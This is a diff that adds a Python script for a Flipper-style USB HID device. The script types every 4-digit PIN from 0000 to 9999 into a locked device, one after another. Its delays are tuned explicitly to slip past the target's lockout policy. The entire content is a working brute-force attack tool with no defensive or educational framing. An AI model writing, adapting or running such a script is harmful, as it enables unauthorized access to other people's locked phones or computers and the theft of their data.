@@ -1,0 +1,43 @@
+from flipper.hid import keyboard
+import time
+
+# Configuration (adjust these based on your device's lockout policy)
+ATTEMPTS_PER_CYCLE = 5  # Number of PIN attempts before a longer delay
+DELAY_BETWEEN_ATTEMPTS = 2  # Seconds to wait after each PIN attempt
+DELAY_AFTER_CYCLE = 30  # Seconds to wait after each cycle to avoid lockout
+
+# USB HID key codes for digits and Enter
+DIGIT_CODES = {
+    '0': 0x27,
+    '1': 0x1E,
+    '2': 0x1F,
+    '3': 0x20,
+    '4': 0x21,
+    '5': 0x22,
+    '6': 0x23,
+    '7': 0x24,
+    '8': 0x25,
+    '9': 0x26
+}
+ENTER_CODE = 0x28  # Enter key
+
+# Brute-force PINs from 0000 to 9999
+for i in range(10000):
+    # Format PIN as a 4-digit string (e.g., "0000", "0001", ..., "9999")
+    pin = f"{i:04d}"
+    
+    # Enter each digit of the PIN
+    for digit in pin:
+        key_code = DIGIT_CODES[digit]
+        keyboard.press(key_code)  # Simulate pressing the digit
+        time.sleep(0.1)  # Small delay between key presses for reliability
+    
+    # Press Enter to submit the PIN
+    keyboard.press(ENTER_CODE)
+    
+    # Wait after the attempt to allow the device to process
+    time.sleep(DELAY_BETWEEN_ATTEMPTS)
+    
+    # After every ATTEMPTS_PER_CYCLE tries, wait longer to avoid lockout
+    if (i + 1) % ATTEMPTS_PER_CYCLE == 0:
+        time.sleep(DELAY_AFTER_CYCLE)
